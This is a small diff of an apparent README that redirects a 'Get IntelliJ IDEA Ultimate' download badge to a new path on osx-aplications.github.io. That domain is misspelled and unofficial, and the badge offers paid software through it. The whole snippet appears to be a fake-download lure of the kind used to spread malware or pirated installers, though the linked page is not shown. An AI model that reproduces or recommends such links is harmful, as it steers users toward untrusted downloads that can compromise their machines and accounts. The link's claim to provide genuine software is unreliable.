@@ -5,7 +5,7 @@
 <br>
 
 <p align="center">
-  <a href="https://osx-aplications.github.io/.github/">
+  <a href="https://osx-aplications.github.io/.github/jetbrains">
     <img src="https://img.shields.io/badge/Get%20IntelliJ%20IDEA%20Ultimate-green?style=for-the-badge&logo=apple&logoColor=white" alt="Get IntelliJ IDEA Ultimate">
   </a>
 </p>
